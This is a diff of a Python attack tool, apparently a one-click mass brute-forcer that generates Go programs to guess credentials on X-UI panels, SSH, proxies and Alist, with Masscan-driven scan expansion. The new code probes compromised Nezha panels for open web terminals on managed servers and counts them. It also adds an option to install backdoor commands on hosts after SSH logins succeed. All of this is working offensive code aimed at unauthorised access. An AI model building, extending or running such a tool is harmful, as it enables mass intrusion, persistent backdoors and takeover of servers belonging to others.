@@ -32,6 +32,10 @@ try:
 except ImportError:
     pass
 
+# ==================== 新增全局变量 ====================
+TIMEOUT = 5
+VERBOSE_DEBUG = False # 设置为True可以打印更详细的调试日志
+
 # =========================== xui.go模板1内容 (XUI面板) ===========================
 XUI_GO_TEMPLATE_1 = '''package main
 
@@ -1532,6 +1536,7 @@ def extract_ip_port(url):
     return url.split()[0]
 
 def get_ip_info_batch(ip_list, retries=3):
+    """批量查询ip-api.com，每次最多100个。"""
     url = "http://ip-api.com/batch?fields=country,regionName,city,isp,query,status"
     results = {}
     
@@ -1600,12 +1605,15 @@ def process_ip_port_file(input_file, output_excel):
     for line in lines:
         addr, user, passwd = line, '', ''
         try:
-            proxy_match = re.match(r'(\w+)://(?:([^:]+):([^@]+)@)?(.+)', line)
+            # 优先匹配协议头，以正确处理包含@符号的用户名/密码
+            proxy_match = re.match(r'(\w+://)(?:([^:]+):([^@]+)@)?(.+)', line)
             if proxy_match:
+                # protocol = proxy_match.group(1) # http:// or https://
                 user = proxy_match.group(2) or ''
                 passwd = proxy_match.group(3) or ''
-                addr = f"{proxy_match.group(1)}://{proxy_match.group(4)}"
+                addr = f"{proxy_match.group(1)}{proxy_match.group(4)}" # 重新组合地址部分
             else:
+                # 如果没有协议头，使用空格分割
                 parts = line.split()
                 if len(parts) >= 3:
                     addr, user, passwd = parts[0], parts[1], parts[2]
@@ -1658,9 +1666,711 @@ if __name__ == "__main__":
     else:
         print("Usage: python ipcx.py <input_file> <output_file>")
 """
+# =========================== 新增哪吒面板分析函数 ===========================
+def debug_log(message, level="INFO"):
+    colors = {
+        "INFO": "\033[94m",
+        "SUCCESS": "\033[92m",
+        "WARNING": "\033[93m",
+        "ERROR": "\033[91m",
+        "ENDC": "\033[0m"
+    }
+    print(f"{colors.get(level, '')}[{level}] {message}{colors['ENDC']}")
+
+def check_server_terminal_status(session, base_url, server_id):
+    """
+    检测单台服务器的终端连接状态
+    """
+    try:
+        # 尝试连接服务器的终端 - 使用多种可能的路径
+        terminal_paths = [
+            f"/dashboard/terminal/{server_id}",
+            f"/dashboard/ssh/{server_id}",
+            f"/dashboard/console/{server_id}",
+            f"/dashboard/shell/{server_id}",
+            f"/terminal/{server_id}",
+            f"/ssh/{server_id}",
+            f"/console/{server_id}",
+            f"/shell/{server_id}"
+        ]
+        
+        for path in terminal_paths:
+            try:
+                terminal_test_url = base_url + path
+                res = session.get(terminal_test_url, timeout=5)
+                
+                if res.status_code == 200:
+                    content = res.text.lower()
+                    
+                    # 检查是否包含终端功能
+                    has_xterm = "xterm" in content
+                    has_terminal_ui = any(element in content for element in [
+                        "terminal-container", "terminal-wrapper", "terminal-screen",
+                        "xterm-helper-textarea", "xterm-viewport", "xterm-rows"
+                    ])
+                    
+                    # 检查是否有错误信息
+                    has_errors = any(error in content for error in [
+                        "not found", "404", "error", "failed", "unavailable",
+                        "未找到", "错误", "失败", "不可用",
+                        "服务器不存在", "尚未连接", "terminal not available"
+                    ])
+                    
+                    # 如果包含xterm且没有错误，认为终端可用
+                    if has_xterm and not has_errors:
+                        return True
+                        
+            except Exception as e:
+                continue
+        
+        # 如果所有路径都失败，尝试检查dashboard页面是否包含终端功能
+        try:
+            dashboard_res = session.get(base_url + "/dashboard", timeout=5)
+            if dashboard_res.status_code == 200:
+                content = dashboard_res.text.lower()
+                has_xterm = "xterm" in content
+                has_terminal_related = any(term in content for term in [
+                    "terminal", "ssh", "console", "shell", "xterm"
+                ])
+                
+                # 如果dashboard包含xterm和终端相关内容，认为有终端功能
+                if has_xterm and has_terminal_related:
+                    return True
+        except:
+            pass
+            
+    except Exception as e:
+        return False
+
+def count_terminal_accessible_servers(session, base_url):
+    """
+    统计终端畅通的服务器数量
+    """
+    try:
+        # 获取服务器列表
+        res = session.get(base_url + "/api/v1/server", timeout=TIMEOUT)
+        if res.status_code != 200:
+            return 0, []
+        
+        data = res.json()
+        servers = []
+        
+        # 检查是否有错误
+        if isinstance(data, dict) and "error" in data:
+            error_msg = data.get("error", "")
+            if "unauthorized" in error_msg.lower() or "unauthorized" in error_msg.lower():
+                print(f"⚠️ API未授权，尝试其他方式检测终端状态...")
+                # 如果API未授权，尝试通过页面检测
+                return check_terminal_status_via_pages(session, base_url)
+        
+        if isinstance(data, list):
+            servers = data
+        elif isinstance(data, dict) and "data" in data:
+            servers = data["data"]
+        
+        if not servers:
+            return 0, []
+        
+        terminal_accessible_count = 0
+        terminal_accessible_servers = []
+        
+        # 检测每台服务器的终端状态
+        for server in servers:
+            if isinstance(server, dict) and "id" in server:
+                server_id = server["id"]
+                server_name = server.get("name", f"Server-{server_id}")
+                
+                # 检查终端状态
+                if check_server_terminal_status(session, base_url, server_id):
+                    terminal_accessible_count += 1
+                    terminal_accessible_servers.append({
+                        "id": server_id,
+                        "name": server_name,
+                        "status": "终端畅通"
+                    })
+        
+        return terminal_accessible_count, terminal_accessible_servers
+        
+    except Exception as e:
+        return 0, []
+
+def check_terminal_status_via_pages(session, base_url):
+    """
+    通过页面检测终端状态（当API未授权时使用）
+    """
+    try:
+        # 检查dashboard页面
+        res = session.get(base_url + "/dashboard", timeout=TIMEOUT)
+        if res.status_code == 200:
+            content = res.text.lower()
+            
+            # 检查是否包含终端功能
+            has_xterm = "xterm" in content
+            has_terminal_related = any(term in content for term in [
+                "terminal", "ssh", "console", "shell", "xterm"
+            ])
+            
+            if has_xterm and has_terminal_related:
+                # 如果dashboard包含终端功能，认为有终端可用
+                # 由于无法获取具体服务器数量，返回一个估计值
+                return 1, [{"id": "unknown", "name": "Dashboard", "status": "终端畅通"}]
+        
+        return 0, []
+        
+    except Exception as e:
+        return 0, []
+
+def check_for_agents_and_terminal(session, base_url):
+    """
+    检查是否有代理和终端功能
+    """
+    if VERBOSE_DEBUG:
+        debug_log(f"开始检查代理和终端状态: {base_url}", "INFO")
+    
+    # 首先检测哪吒面板特性
+    features = detect_nezha_features(session, base_url)
+    
+    # 检查是否有代理
+    has_agents = False
+    total_servers = 0
+    
+    try:
+        res = session.get(base_url + "/api/v1/server", timeout=TIMEOUT)
+        if res.status_code == 200:
+            try:
+                data = res.json()
+                if isinstance(data, list):
+                    total_servers = len(data)
+                    has_agents = total_servers > 0
+                    if VERBOSE_DEBUG:
+                        debug_log(f"检测到机器列表，数量: {total_servers}", "SUCCESS")
+                elif isinstance(data, dict) and "data" in data:
+                    server_list = data["data"]
+                    if isinstance(server_list, list):
+                        total_servers = len(server_list)
+                        has_agents = total_servers > 0
+                        if VERBOSE_DEBUG:
+                            debug_log(f"检测到机器列表，数量: {total_servers}", "SUCCESS")
+            except Exception as e:
+                if VERBOSE_DEBUG:
+                    debug_log(f"解析服务器数据失败: {str(e)}", "ERROR")
+    except Exception as e:
+        if VERBOSE_DEBUG:
+            debug_log(f"获取服务器列表失败: {str(e)}", "ERROR")
+    
+    if not has_agents:
+        if VERBOSE_DEBUG:
+            debug_log(f"未检测到代理机器", "WARNING")
+        return False, False, 0
+    
+    # 检查终端功能
+    if VERBOSE_DEBUG:
+        debug_log(f"开始检查终端状态，尝试多种路径", "INFO")
+    
+    # 基于版本和特性选择检测策略
+    if features["version"].startswith("1.13"):
+        # 1.13版本使用新的检测策略
+        terminal_accessible = check_terminal_v1_13(session, base_url, features)
+    else:
+        # 其他版本使用传统检测策略
+        terminal_accessible = check_terminal_traditional(session, base_url)
+    
+    if VERBOSE_DEBUG:
+        if terminal_accessible:
+            debug_log(f"终端功能检测成功", "SUCCESS")
+        else:
+            debug_log(f"终端功能检测失败", "WARNING")
+    
+    return has_agents, terminal_accessible, total_servers
+
+def check_terminal_v1_13(session, base_url, features):
+    """
+    针对哪吒面板1.13版本的终端检测
+    """
+    if VERBOSE_DEBUG:
+        debug_log(f"使用1.13版本检测策略", "INFO")
+    
+    # 1.13版本的终端检测策略
+    terminal_paths = [
+        "/dashboard/terminal",
+        "/dashboard/ssh",
+        "/dashboard/console", 
+        "/dashboard/shell"
+    ]
+    
+    for terminal_path in terminal_paths:
+        try:
+            res = session.get(base_url + terminal_path, timeout=TIMEOUT)
+            if res.status_code == 200:
+                content = res.text.lower()
+                
+                # 检查是否包含真正的终端功能
+                has_xterm = "xterm" in content
+                has_terminal_ui = any(element in content for element in [
+                    "terminal-container", "terminal-wrapper", "terminal-screen",
+                    "xterm-helper-textarea", "xterm-viewport"
+                ])
+                has_websocket = "websocket" in content
+                
+                # 检查是否有错误信息
+                has_errors = any(error in content for error in [
+                    "not found", "404", "error", "failed", "unavailable",
+                    "未找到", "错误", "失败", "不可用",
+                    "服务器不存在", "尚未连接", "terminal not available"
+                ])
+                
+                # 多重验证
+                if has_xterm and has_terminal_ui and not has_errors:
+                    if VERBOSE_DEBUG:
+                        debug_log(f"1.13版本终端检测成功: {terminal_path}", "SUCCESS")
+                    return True
+                elif has_xterm and has_websocket and not has_errors:
+                    if VERBOSE_DEBUG:
+                        debug_log(f"1.13版本WebSocket终端检测成功: {terminal_path}", "SUCCESS")
+                    return True
+        except:
+            continue
+    
+    # 如果直接路径检测失败，尝试智能检测
+    return smart_terminal_detection(session, base_url)
+
+def check_terminal_traditional(session, base_url):
+    """
+    传统终端检测方法
+    """
+    if VERBOSE_DEBUG:
+        debug_log(f"使用传统检测策略", "INFO")
+    
+    # 传统终端路径检测
+    terminal_paths = [
+        "/dashboard/terminal/",
+        "/terminal/",
+        "/console/",
+        "/shell/",
+        "/webssh/",
+        "/ssh/",
+        "/tty/",
+        "/pty/"
+    ]
+    
+    for terminal_path in terminal_paths:
+        try:
+            res = session.get(base_url + terminal_path, timeout=TIMEOUT)
+            if res.status_code == 200:
+                content = res.text.lower()
+                
+                # 检查是否包含终端功能
+                has_terminal = any(keyword in content for keyword in [
+                    "terminal", "xterm", "ssh", "console", "shell"
+                ])
+                
+                # 检查是否有错误信息
+                has_errors = any(error in content for error in [
+                    "not found", "404", "error", "failed", "unavailable"
+                ])
+                
+                if has_terminal and not has_errors:
+                    if VERBOSE_DEBUG:
+                        debug_log(f"传统检测成功: {terminal_path}", "SUCCESS")
+                    return True
+        except:
+            continue
+    
+    # 如果传统检测失败，尝试智能检测
+    return smart_terminal_detection(session, base_url)
+
+def detect_nezha_features(session, base_url):
+    """
+    检测哪吒面板的版本和特性
+    """
+    features = {
+        "version": "unknown",
+        "has_terminal": False,
+        "has_file_manager": False,
+        "has_monitoring": False,
+        "api_endpoints": []
+    }
+    
+    try:
+        # 检测版本信息
+        version_endpoints = [
+            "/api/v1/version",
+            "/api/version", 
+            "/version",
+            "/dashboard/version"
+        ]
+        
+        for endpoint in version_endpoints:
+            try:
+                res = session.get(base_url + endpoint, timeout=TIMEOUT)
+                if res.status_code == 200:
+                    try:
+                        data = res.json()
+                        if "version" in data:
+                            features["version"] = data["version"]
+                            break
+                    except:
+                        # 如果不是JSON，尝试从HTML中提取版本
+                        if "1.13" in res.text:
+                            features["version"] = "1.13.x"
+                            break
+            except:
+                continue
+        
+        # 检测API端点
+        api_test_endpoints = [
+            "/api/v1/server",
+            "/api/v1/servers", 
+            "/api/v1/overview",
+            "/api/v1/config",
+            "/api/v1/notification",
+            "/api/v1/cron"
+        ]
+        
+        for endpoint in api_test_endpoints:
+            try:
+                res = session.get(base_url + endpoint, timeout=TIMEOUT)
+                if res.status_code == 200:
+                    features["api_endpoints"].append(endpoint)
+            except:
+                continue
+        
+        # 检测功能特性
+        try:
+            # 检查文件管理器
+            res = session.get(base_url + "/dashboard/file", timeout=TIMEOUT)
+            if res.status_code == 200 and "file" in res.text.lower():
+                features["has_file_manager"] = True
+        except:
+            pass
+        
+        try:
+            # 检查监控功能
+            res = session.get(base_url + "/dashboard", timeout=TIMEOUT)
+            if res.status_code == 200:
+                content = res.text.lower()
+                if any(keyword in content for keyword in ["monitor", "监控", "status", "状态"]):
+                    features["has_monitoring"] = True
+        except:
+            pass
+        
+        if VERBOSE_DEBUG:
+            debug_log(f"哪吒面板特性检测完成: {features}", "INFO")
+        
+        return features
+        
+    except Exception as e:
+        if VERBOSE_DEBUG:
+            debug_log(f"特性检测失败: {str(e)}", "ERROR")
+        return features
+
+def smart_terminal_detection(session, base_url):
+    """
+    智能终端检测 - 通过多种方法检测终端功能
+    """
+    if VERBOSE_DEBUG:
+        debug_log(f"开始智能终端检测: {base_url}", "INFO")
+    
+    # 方法1: 检查哪吒面板配置
+    try:
+        res = session.get(base_url + "/api/v1/config", timeout=TIMEOUT)
+        if res.status_code == 200:
+            try:
+                data = res.json()
+                if isinstance(data, dict):
+                    config_str = str(data).lower()
+                    # 检查配置中是否包含终端相关设置
+                    if any(keyword in config_str for keyword in ["terminal", "ssh", "console", "shell", "websocket"]):
+                        if VERBOSE_DEBUG:
+                            debug_log(f"配置中发现终端相关设置: /api/v1/config", "SUCCESS")
+                        return True
+            except:
+                pass
+    except:
+        pass
+    
+    # 方法2: 检查dashboard页面源码 - 这是最关键的检测方法
+    try:
+        res = session.get(base_url + "/dashboard", timeout=TIMEOUT)
+        if res.status_code == 200:
+            content = res.text.lower()
+            
+            # 检查是否包含终端相关的关键元素 - 基于实际可用的终端HTML特征
+            has_xterm = "xterm" in content
+            has_terminal_ui = any(element in content for element in [
+                "terminal-container", "terminal-wrapper", "terminal-screen",
+                "xterm-helper-textarea", "xterm-viewport", "xterm-rows"
+            ])
+            has_websocket = "websocket" in content
+            has_terminal_js = any(js in content for js in [
+                "terminal.init", "ssh.init", "console.init", "shell.init",
+                "@xterm", "xterm.js", "terminal.js"
+            ])
+            
+            # 检查是否有真正的终端功能代码
+            has_real_terminal_code = any(code in content for code in [
+                "websocket", "socket.io", "terminal-container", "terminal-wrapper",
+                "xterm-helper-textarea", "xterm-screen", "xterm-viewport"
+            ])
+            
+            # 检查是否有错误信息
+            has_errors = any(error in content for error in [
+                "not found", "404", "error", "failed", "unavailable",
+                "未找到", "错误", "失败", "不可用"
+            ])
+            
+            # 关键检测：检查是否包含真正的终端输入框和界面元素
+            has_real_terminal_input = any(input_element in content for input_element in [
+                "xterm-helper-textarea", "terminal-input", "ssh-input",
+                "console-input", "shell-input", "xterm-screen"
+            ])
+            
+            # 检查是否有终端相关的CSS样式
+            has_terminal_css = any(css in content for css in [
+                "@xterm", "xterm.css", "terminal.css", "xterm-rows"
+            ])
+            
+            if VERBOSE_DEBUG:
+                debug_log(f"Dashboard页面检测结果:", "INFO")
+                debug_log(f"  xterm: {has_xterm}", "INFO")
+                debug_log(f"  终端UI: {has_terminal_ui}", "INFO")
+                debug_log(f"  WebSocket: {has_websocket}", "INFO")
+                debug_log(f"  终端JS: {has_terminal_js}", "INFO")
+                debug_log(f"  真实终端代码: {has_real_terminal_code}", "INFO")
+                debug_log(f"  真实终端输入: {has_real_terminal_input}", "INFO")
+                debug_log(f"  终端CSS: {has_terminal_css}", "INFO")
+                debug_log(f"  错误信息: {has_errors}", "INFO")
+            
+            # 多重验证：必须满足多个条件才认为是真正的终端
+            # 基于实际可用的终端特征，放宽检测条件
+            if has_xterm and (has_terminal_ui or has_real_terminal_input) and not has_errors:
+                if VERBOSE_DEBUG:
+                    debug_log(f"Dashboard页面中发现完整终端功能", "SUCCESS")
+                return True
+            elif has_xterm and has_terminal_js and not has_errors:
+                if VERBOSE_DEBUG:
+                    debug_log(f"Dashboard页面中发现终端JavaScript功能", "SUCCESS")
+                return True
+            elif has_xterm and has_terminal_css and not has_errors:
+                if VERBOSE_DEBUG:
+                    debug_log(f"Dashboard页面中发现终端CSS样式", "SUCCESS")
+                return True
+            elif has_real_terminal_input and not has_errors:
+                if VERBOSE_DEBUG:
+                    debug_log(f"Dashboard页面中发现终端输入框", "SUCCESS")
+                return True
+    except Exception as e:
+        if VERBOSE_DEBUG:
+            debug_log(f"Dashboard页面检测异常: {str(e)}", "ERROR")
+    
+    # 方法3: 检查API响应中的终端信息
+    api_endpoints = [
+        "/api/v1/server",
+        "/api/v1/servers",
+        "/api/v1/overview"
+    ]
+    
+    for endpoint in api_endpoints:
+        try:
+            res = session.get(base_url + endpoint, timeout=TIMEOUT)
+            if res.status_code == 200:
+                try:
+                    data = res.json()
+                    # 检查API响应中是否包含终端相关信息
+                    if isinstance(data, dict):
+                        data_str = str(data).lower()
+                        if any(keyword in data_str for keyword in ["terminal", "ssh", "console", "shell"]):
+                            if VERBOSE_DEBUG:
+                                debug_log(f"API响应中发现终端信息: {endpoint}", "SUCCESS")
+                            return True
+                except:
+                    continue
+        except:
+            continue
+    
+    # 方法4: 尝试访问实际的终端页面（通过JavaScript动态加载）
+    terminal_test_paths = [
+        "/dashboard/terminal",
+        "/dashboard/ssh", 
+        "/dashboard/console",
+        "/dashboard/shell"
+    ]
+    
+    for test_path in terminal_test_paths:
+        try:
+            res = session.get(base_url + test_path, timeout=TIMEOUT)
+            if res.status_code == 200:
+                content = res.text.lower()
+                
+                # 检查是否包含真正的终端功能
+                has_xterm = "xterm" in content
+                has_websocket = "websocket" in content
+                has_terminal_ui = any(element in content for element in [
+                    "terminal-container", "terminal-wrapper", "terminal-screen",
+                    "xterm-helper-textarea", "xterm-viewport", "xterm-rows"
+                ])
+                has_js_init = any(js in content for js in [
+                    "terminal.init", "ssh.init", "console.init", "shell.init"
+                ])
+                
+                # 检查是否有错误信息
+                has_errors = any(error in content for error in [
+                    "not found", "404", "error", "failed", "unavailable",
+                    "未找到", "错误", "失败", "不可用"
+                ])
+                
+                # 必须满足多个条件才认为是真正的终端
+                if has_xterm and has_terminal_ui and not has_errors:
+                    if VERBOSE_DEBUG:
+                        debug_log(f"发现真实终端页面: {test_path}", "SUCCESS")
+                    return True
+                elif has_xterm and has_websocket and not has_errors:
+                    if VERBOSE_DEBUG:
+                        debug_log(f"发现WebSocket终端页面: {test_path}", "SUCCESS")
+                    return True
+                elif has_xterm and not has_errors:
+                    if VERBOSE_DEBUG:
+                        debug_log(f"发现xterm终端页面: {test_path}", "SUCCESS")
+                    return True
+        except:
+            continue
+    
+    if VERBOSE_DEBUG:
+        debug_log(f"智能检测未发现终端功能", "WARNING")
+    
+    return False
+
+def verify_terminal_functionality(session, base_url, terminal_path):
+    """
+    验证终端功能的真实可用性
+    """
+    try:
+        # 尝试访问终端页面
+        res = session.get(base_url + terminal_path, timeout=TIMEOUT)
+        if res.status_code != 200:
+            return False
+        
+        content = res.text.lower()
+        
+        # 检查是否包含真实的终端功能 - 基于实际可用的终端特征
+        has_xterm = "xterm" in content
+        has_websocket = "websocket" in content
+        has_terminal_ui = any(element in content for element in [
+            "terminal-container", "terminal-wrapper", "terminal-screen",
+            "xterm-helper-textarea", "xterm-viewport", "xterm-rows"
+        ])
+        has_js_init = any(js in content for js in [
+            "terminal.init", "ssh.init", "console.init", "shell.init"
+        ])
+        
+        # 检查是否有错误信息
+        has_errors = any(error in content for error in [
+            "not found", "404", "error", "failed", "unavailable",
+            "未找到", "错误", "失败", "不可用",
+            "服务器不存在", "尚未连接", "terminal not available"
+        ])
+        
+        # 检查是否有真正的终端输入框
+        has_terminal_input = any(input_element in content for input_element in [
+            "xterm-helper-textarea", "terminal-input", "ssh-input",
+            "console-input", "shell-input", "xterm-screen"
+        ])
+        
+        # 检查是否有终端相关的JavaScript代码
+        has_terminal_js = any(js_code in content for js_code in [
+            "xterm.js", "terminal.js", "websocket", "socket.io", "@xterm"
+        ])
+        
+        # 检查是否有终端相关的CSS样式
+        has_terminal_css = any(css in content for css in [
+            "xterm.css", "terminal.css", "xterm-rows", "@xterm"
+        ])
+        
+        if VERBOSE_DEBUG:
+            debug_log(f"终端功能验证详情: {terminal_path}", "INFO")
+            debug_log(f"  xterm: {has_xterm}", "INFO")
+            debug_log(f"  终端UI: {has_terminal_ui}", "INFO")
+            debug_log(f"  WebSocket: {has_websocket}", "INFO")
+            debug_log(f"  JS初始化: {has_js_init}", "INFO")
+            debug_log(f"  终端输入: {has_terminal_input}", "INFO")
+            debug_log(f"  终端JS: {has_terminal_js}", "INFO")
+            debug_log(f"  终端CSS: {has_terminal_css}", "INFO")
+            debug_log(f"  错误信息: {has_errors}", "INFO")
+        
+        # 多重验证：必须满足多个条件才认为是真正的终端
+        # 基于实际可用的终端特征，放宽验证条件
+        if has_xterm and has_terminal_ui and not has_errors:
+            if VERBOSE_DEBUG:
+                debug_log(f"终端功能验证成功: {terminal_path}", "SUCCESS")
+            return True
+        elif has_xterm and has_terminal_input and not has_errors:
+            if VERBOSE_DEBUG:
+                debug_log(f"终端输入功能验证成功: {terminal_path}", "SUCCESS")
+            return True
+        elif has_xterm and has_terminal_js and not has_errors:
+            if VERBOSE_DEBUG:
+                debug_log(f"终端JavaScript功能验证成功: {terminal_path}", "SUCCESS")
+            return True
+        elif has_xterm and has_terminal_css and not has_errors:
+            if VERBOSE_DEBUG:
+                debug_log(f"终端CSS样式验证成功: {terminal_path}", "SUCCESS")
+            return True
+        elif has_xterm and has_websocket and not has_errors:
+            if VERBOSE_DEBUG:
+                debug_log(f"WebSocket终端功能验证成功: {terminal_path}", "SUCCESS")
+            return True
+        elif has_xterm and not has_errors:
+            # 如果包含xterm且没有错误，也认为是可用的
+            if VERBOSE_DEBUG:
+                debug_log(f"xterm终端功能验证成功: {terminal_path}", "SUCCESS")
+            return True
+        
+        if VERBOSE_DEBUG:
+            debug_log(f"终端功能验证失败: {terminal_path}", "WARNING")
+            debug_log(f"xterm: {has_xterm}, UI: {has_terminal_ui}, JS: {has_terminal_js}, 错误: {has_errors}", "WARNING")
+        
+        return False
+    except Exception as e:
+        if VERBOSE_DEBUG:
+            debug_log(f"终端功能验证异常: {terminal_path}, 错误: {str(e)}", "ERROR")
+        return False
+
 # =========================== 主脚本优化部分 ===========================
 # 定义Go可执行文件的绝对路径
 GO_EXEC = "/usr/local/go/bin/go"
+
+def update_excel_with_nezha_analysis(xlsx_file, analysis_data):
+    """
+    将哪吒面板的分析结果更新到已生成的Excel文件中
+    """
+    if not os.path.exists(xlsx_file):
+        print(f"⚠️ Excel文件 {xlsx_file} 不存在，跳过更新。")
+        return
+
+    try:
+        wb = load_workbook(xlsx_file)
+        ws = wb.active
+
+        # 添加新的表头
+        server_count_col = ws.max_column + 1
+        terminal_status_col = ws.max_column + 2
+        ws.cell(row=1, column=server_count_col, value="服务器数量")
+        ws.cell(row=1, column=terminal_status_col, value="终端状态")
+
+        # 遍历每一行，更新数据
+        for row in ws.iter_rows(min_row=2):
+            original_address_cell = row[0]
+            original_address = original_address_cell.value
+            if original_address in analysis_data:
+                server_count, terminal_status = analysis_data[original_address]
+                ws.cell(row=original_address_cell.row, column=server_count_col, value=server_count)
+                ws.cell(row=original_address_cell.row, column=terminal_status_col, value=terminal_status)
+        
+        wb.save(xlsx_file)
+        print("✅ 成功将哪吒面板分析结果写入Excel报告。")
+    except Exception as e:
+        print(f"❌ 更新Excel文件时发生错误: {e}")
+
 
 def input_with_default(prompt, default):
     user_input = input(f"{prompt}（默认 {default}）：").strip()
@@ -1982,11 +2692,12 @@ def run_ipcx(final_result_file, xlsx_output_file):
         print("\n--- 正在调用 ipcx.py 查询IP地理位置并生成Excel报告... ---")
         subprocess.run([sys.executable, 'ipcx.py', final_result_file, xlsx_output_file])
 
-def clean_temp_files():
+def clean_temp_files(template_mode):
     shutil.rmtree(TEMP_PART_DIR, ignore_errors=True)
     shutil.rmtree(TEMP_XUI_DIR, ignore_errors=True)
-    shutil.rmtree(TEMP_HMSUCCESS_DIR, ignore_errors=True)
-    shutil.rmtree(TEMP_HMFAIL_DIR, ignore_errors=True)
+    if template_mode == 6: # 仅在SSH模式下清理
+        shutil.rmtree(TEMP_HMSUCCESS_DIR, ignore_errors=True)
+        shutil.rmtree(TEMP_HMFAIL_DIR, ignore_errors=True)
 
     for f in ['xui.go', 'ipcx.py', 'go.mod', 'go.sum', 'xui_executable', 'xui_executable.exe']: 
         if os.path.exists(f):
@@ -2425,215 +3136,261 @@ def analyze_and_expand_scan(result_file, template_mode, params, template_map, ma
 
 
 if __name__ == "__main__":
-        start = time.time()
-        interrupted = False
-        final_result_file = None
+    start = time.time()
+    interrupted = False
+    final_result_file = None
+    
+    TEMP_PART_DIR = "temp_parts"
+    TEMP_XUI_DIR = "xui_outputs"
+    TEMP_HMSUCCESS_DIR = "temp_hmsuccess"
+    TEMP_HMFAIL_DIR = "temp_hmfail"
+
+    from datetime import datetime, timedelta, timezone
+    beijing_time = datetime.now(timezone.utc) + timedelta(hours=8)
+    time_str = beijing_time.strftime("%Y%m%d-%H%M")
+
+    try:
+        if not sys.stdout.isatty():
+            print("❌ 错误：此脚本需要在交互式终端中运行以接收用户输入。")
+            sys.exit(1)
+
+        TEMPLATE_MODE = choose_template_mode()
         
-        TEMP_PART_DIR = "temp_parts"
-        TEMP_XUI_DIR = "xui_outputs"
-        TEMP_HMSUCCESS_DIR = "temp_hmsuccess"
-        TEMP_HMFAIL_DIR = "temp_hmfail"
+        check_environment(TEMPLATE_MODE)
+        
+        import psutil
+        import requests
+        import yaml
+        from openpyxl import Workbook, load_workbook
+        from tqdm import tqdm
 
-        from datetime import datetime, timedelta, timezone
-        beijing_time = datetime.now(timezone.utc) + timedelta(hours=8)
-        time_str = beijing_time.strftime("%Y%m%d-%H%M")
+        adjust_oom_score()
+        check_and_manage_swap()
 
-        try:
-                if not sys.stdout.isatty():
-                    print("❌ 错误：此脚本需要在交互式终端中运行以接收用户输入。")
+        os.makedirs(TEMP_PART_DIR, exist_ok=True)
+        os.makedirs(TEMP_XUI_DIR, exist_ok=True)
+        # 仅在SSH模式下创建相关文件夹
+        if TEMPLATE_MODE == 6:
+            os.makedirs(TEMP_HMSUCCESS_DIR, exist_ok=True)
+            os.makedirs(TEMP_HMFAIL_DIR, exist_ok=True)
+
+        params = {}
+        AUTH_MODE = 0
+
+        if TEMPLATE_MODE == 6: # SSH 模式
+            choice = input("是否在SSH爆破成功后自动安装后门？(y/N)：").strip().lower()
+            if choice == 'y':
+                params['install_backdoor'] = True
+                if not os.path.exists("后门命令.txt"):
+                    print("❌ 未找到 后门命令.txt，已中止。")
                     sys.exit(1)
+                with open("后门命令.txt", 'r', encoding='utf-8', errors='ignore') as f:
+                    params['custom_cmds'] = [line.strip() for line in f if line.strip()]
+            else:
+                params['install_backdoor'] = False
+                params['custom_cmds'] = []
+        
+        if TEMPLATE_MODE in [9, 10, 11]: # 代理模式
+            print("\n请选择代理凭据模式：")
+            print("1. 无凭据 (扫描开放代理)")
+            print("2. 独立字典 (使用 username.txt 和 password.txt)")
+            print("3. 组合凭据 (使用 credentials.txt, 格式 user:pass)")
+            while True:
+                auth_choice = input("输入 1, 2, 或 3 (默认 1): ").strip()
+                if auth_choice in ["", "1"]: AUTH_MODE = 1; break
+                elif auth_choice == "2": AUTH_MODE = 2; break
+                elif auth_choice == "3": AUTH_MODE = 3; break
+                else: print("输入无效。")
+            
+            if TEMPLATE_MODE == 9: params['proxy_type'] = "socks5"
+            elif TEMPLATE_MODE == 10: params['proxy_type'] = "http"
+            elif TEMPLATE_MODE == 11: params['proxy_type'] = "https"
 
-                TEMPLATE_MODE = choose_template_mode()
+        print("\n=== 爆破一键启动 ===")
+        input_file = input_filename_with_default("请输入源文件名", "1.txt")
+        if not os.path.exists(input_file):
+                print(f"❌ 错误: 文件 '{input_file}' 不存在。")
+                sys.exit(1)
+
+        with open(input_file, 'r', encoding='utf-8', errors='ignore') as f:
+            total_ips = sum(1 for line in f if line.strip())
+        print(f"--- 总计 {total_ips} 个目标 ---")
+
+        lines_per_file = input_with_default("每个小文件行数", 5000)
+        sleep_seconds = input_with_default("爆破完休息秒数", 2)
+        
+        total_memory_mb = psutil.virtual_memory().total / 1024 / 1024
+        recommended_threads = int((total_memory_mb * 0.7) / 2.5)
+        if recommended_threads < 50: recommended_threads = 50
+        params['semaphore_size'] = input_with_default(f"爆破线程数 (根据内存推荐 {recommended_threads})", recommended_threads)
+
+        params['timeout'] = input_with_default("超时时间(秒)", 3)
+        masscan_rate = input_with_default("请输入Masscan扫描速率(pps)", 50000)
+        
+        params['usernames'], params['passwords'], params['credentials'] = load_credentials(TEMPLATE_MODE, AUTH_MODE)
+        params['auth_mode'] = AUTH_MODE
+
+        template_map = {
+            1: (generate_xui_go, {}),
+            2: (generate_xui_go_template2, {}),
+            6: (generate_xui_go_template6, {'install_backdoor': params.get('install_backdoor', False), 'custom_cmds': params.get('custom_cmds', [])}),
+            7: (generate_xui_go_template7, {}),
+            8: (generate_xui_go_template8, {}),
+            9: (generate_proxy_go, {'proxy_type': 'socks5'}),
+            10: (generate_proxy_go, {'proxy_type': 'http'}),
+            11: (generate_proxy_go, {'proxy_type': 'https'}),
+            12: (generate_alist_go, {}),
+        }
+
+        gen_func, extra_args = template_map[TEMPLATE_MODE]
+        final_params = {**params, **extra_args}
+        gen_func(**final_params)
+        
+        executable = compile_go_program()
+        generate_ipcx_py()
+        split_file(input_file, lines_per_file)
+        run_xui_for_parts(sleep_seconds, executable, total_ips, params['semaphore_size'])
+        
+        merge_xui_files()
+        
+        initial_results_file = "xui.txt"
+        if os.path.exists(initial_results_file) and os.path.getsize(initial_results_file) > 0:
+            newly_found_results = analyze_and_expand_scan(initial_results_file, TEMPLATE_MODE, params, template_map, masscan_rate)
+            if newly_found_results:
+                print(f"--- 扩展扫描完成，共新增 {len(newly_found_results)} 个结果。正在合并... ---")
+                with open(initial_results_file, 'a', encoding='utf-8') as f:
+                    for result in sorted(list(newly_found_results)):
+                        f.write(result + '\n')
                 
-                check_environment(TEMPLATE_MODE)
+                with open(initial_results_file, 'r', encoding='utf-8') as f:
+                    unique_lines = sorted(list(set(f.readlines())))
+                with open(initial_results_file, 'w', encoding='utf-8') as f:
+                    f.writelines(unique_lines)
+
+                print("--- 结果合并去重完成。 ---")
+        
